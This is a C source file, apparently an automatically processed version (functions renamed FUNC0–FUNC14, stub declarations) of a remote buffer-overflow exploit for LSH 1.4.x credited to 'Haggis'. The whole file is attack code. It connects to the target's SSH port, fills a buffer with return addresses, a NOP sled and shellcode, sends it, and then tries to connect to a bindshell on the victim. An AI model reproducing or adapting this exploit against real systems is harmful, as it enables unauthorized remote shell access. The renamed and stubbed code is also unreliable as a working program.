#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {char* platform; int /*<<< orphan*/  retAddr; } ;

/* Variables and functions */
 int EXPLOIT_BUF_SIZE ; 
 int NOPS_LEN ; 
 int /*<<< orphan*/  SIZ ; 
 int /*<<< orphan*/  SSH_PORT ; 
 size_t FUNC0 (int /*<<< orphan*/ ) ; 
 scalar_t__ buf ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (int /*<<< orphan*/ ) ; 
 int FUNC3 () ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/ * FUNC5 (char*) ; 
 int FUNC6 (int,char**,char*) ; 
 char* host ; 
 int /*<<< orphan*/ * hostStruct ; 
 int /*<<< orphan*/  FUNC7 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int /*<<< orphan*/  FUNC9 (int,scalar_t__) ; 
 int /*<<< orphan*/  FUNC10 (int) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 
 int /*<<< orphan*/  shellcode ; 
 int FUNC12 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 TYPE_1__* targets ; 
 char* usage ; 
 size_t useTarget ; 

FUNC14(int argc, char **argv)
{
	int ch, i, targetSock;
	unsigned long *retPtr;
	char *charRetPtr;

	FUNC11("LSH 1.4.x (others?) exploit by Haggis (haggis@haggis.kicks-ass.net)\n\n");
	while((ch=FUNC6(argc, argv, "t:T:h"))!=-1) {
		switch(ch) {
			case 't':
				FUNC13(host, optarg, SIZ-1);
				break;
			case 'T':
				useTarget=FUNC0(optarg);
				break;
			case 'h':
			default:
				FUNC11("%s\n",usage);
				FUNC11("Available platforms:\n");
				for(i=0;targets[i].platform;i++)
					FUNC11(" %2d. %s\n", i, targets[i].platform);
				FUNC11("\n");
				FUNC4(0);
				break;
		}
	}

	if(host[0]=='\0') {
		FUNC11("[*] You must specify a host! Use -h for help\n");
		FUNC4(1);
	}
	if((hostStruct=FUNC5(host))==NULL) {
		FUNC11("[*] Couldn't resolve host %s\nUse '%s -h' for help\n", host,argv[0]);
		FUNC4(1);
	}
	if((targetSock=FUNC2(SSH_PORT))==-1) {
		FUNC11("[*] Coulnd't connect to host %s\n", host);
		FUNC4(1);
	}
	FUNC8(targetSock);

	FUNC11("[-] Building exploit buffer...\n");

	retPtr=(unsigned long *)buf;
	for(i=0;i<EXPLOIT_BUF_SIZE/4;i++)
		*(retPtr++)=targets[useTarget].retAddr;

	charRetPtr=(unsigned char *)retPtr;
	for(i=0;i<NOPS_LEN-FUNC12(shellcode);i++)
		*(charRetPtr++)=(unsigned long)0x90;

	FUNC7(charRetPtr, shellcode, FUNC12(shellcode));
	*(charRetPtr+FUNC12(shellcode))='\n';
	*(charRetPtr+FUNC12(shellcode)+1)='\0';

	FUNC11("[-] Sending exploit string...\n");
	FUNC9(targetSock, buf);
	FUNC1(targetSock);

	FUNC11("[-] Sleeping...\n");
	FUNC10(100000);

	FUNC11("[-] Connecting to bindshell...\n");
	if(FUNC3()==-1)
		FUNC11("[*] Could not connect to %s - the exploit failed\n", host);

	FUNC4(0);
}